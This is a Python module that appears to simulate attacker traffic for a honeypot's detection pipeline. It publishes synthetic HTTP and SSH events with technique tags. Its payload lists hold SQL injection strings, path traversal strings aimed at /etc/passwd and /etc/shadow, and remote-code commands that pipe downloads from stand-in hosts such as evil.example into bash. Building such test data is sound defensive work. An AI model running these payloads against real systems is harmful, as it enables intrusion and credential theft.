"""
attack_simulator.py  (v2)
--------------------------
Generates realistic synthetic honeypot events, now including:
  - Coordinated subnet cluster attacks (3+ IPs from the same /24)
  - Technique-tagged payloads (SQLi, path traversal, RCE attempts)
  - Bot-like regular timing for some attackers
  - Human-like irregular timing for others
"""
from __future__ import annotations
import random
import threading
import time

from app.capture.event_bus import HoneypotEvent, bus
from app.intel.signatures import BAIT_PATHS, COMMON_CREDENTIAL_PAIRS

_SQLi_SNIPPETS = ["' UNION SELECT 1,2,3 --", "' OR '1'='1", "SLEEP(5)"]
_PATH_SNIPPETS = ["../../../../etc/passwd", "../../../etc/shadow", "%00/etc/passwd"]
_RCE_SNIPPETS = ["wget http://evil.example/payload.sh", "curl http://x.x/shell.sh|bash", "base64_decode(payload)"]
_SCANNER_UA = [
    "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
    "python-requests/2.31.0", "zgrab/0.x", "Go-http-client/1.1",
    "Nuclei - Community Edition",
]


def _random_public_ip() -> str:
    first = random.choice([r for r in range(1, 224) if r not in (10, 127)])
    return f"{first}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def _same_subnet_ip(base_ip: str) -> str:
    parts = base_ip.split(".")[:3]
    return ".".join(parts) + f".{random.randint(2, 254)}"


class AttackSimulator:
    def __init__(self, min_interval: float = 0.3, max_interval: float = 2.0):
        self.min_interval = min_interval
        self.max_interval = max_interval
        self._running = False
        self._thread: threading.Thread | None = None
        self._repeat_offenders = [_random_public_ip() for _ in range(4)]
        # Two subnet clusters for demo
        self._cluster_a_base = _random_public_ip()
        self._cluster_b_base = _random_public_ip()
        self._cluster_ips_a = [_same_subnet_ip(self._cluster_a_base) for _ in range(5)]
        self._cluster_ips_b = [_same_subnet_ip(self._cluster_b_base) for _ in range(4)]
        self._tick = 0

    @property
    def is_running(self):
        return self._running

    def _pick_ip(self) -> tuple[str, bool]:
        """Returns (ip, is_bot) where is_bot drives timing regularity."""
        r = random.random()
        if r < 0.30:
            return random.choice(self._cluster_ips_a), True
        if r < 0.45:
            return random.choice(self._cluster_ips_b), True
        if r < 0.65:
            return random.choice(self._repeat_offenders), random.random() < 0.5
        return _random_public_ip(), False

    def _emit_http(self, ip: str):
        path = random.choice(BAIT_PATHS)
        technique = random.choice(["sqli", "path", "rce", "scan", "plain"])
        if technique == "sqli":
            snippet = random.choice(_SQLi_SNIPPETS)
            tags = {"SQL_INJECTION"}
        elif technique == "path":
            snippet = random.choice(_PATH_SNIPPETS)
            tags = {"PATH_TRAVERSAL", "FILE_DISCLOSURE"}
        elif technique == "rce":
            snippet = random.choice(_RCE_SNIPPETS)
            tags = {"RCE_ATTEMPT"}
        elif technique == "scan":
            snippet = ""
            tags = {"SCANNER"}
        else:
            snippet = ""
            tags = set()
        raw_text = f"{path} {snippet}".strip()
        bus.publish(HoneypotEvent(
            service="http", ip=ip, path=path, method=random.choice(["GET", "POST"]),
            raw_text=raw_text, user_agent=random.choice(_SCANNER_UA),
            technique_tags=tags,
        ))

    def _emit_ssh(self, ip: str):
        if random.random() < 0.72:
            username, password = random.choice(list(COMMON_CREDENTIAL_PAIRS))
        else:
            username = random.choice(["deploy", "git", "svc", "jenkins", "backup"])
            password = f"P@ss{random.randint(10,99)}!"
        bus.publish(HoneypotEvent(
            service="ssh", ip=ip, username=username, password=password,
            raw_text=f"password-auth username={username} password={password}",
            technique_tags={"CRED_STUFFING"},
        ))

    def _loop(self):
        while self._running:
            self._tick += 1
            ip, is_bot = self._pick_ip()
            if random.random() < 0.62:
                self._emit_http(ip)
            else:
                self._emit_ssh(ip)
            if is_bot:
                time.sleep(self.min_interval + random.uniform(0, 0.15))
            else:
                time.sleep(random.uniform(self.min_interval, self.max_interval))

    def start(self):
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False
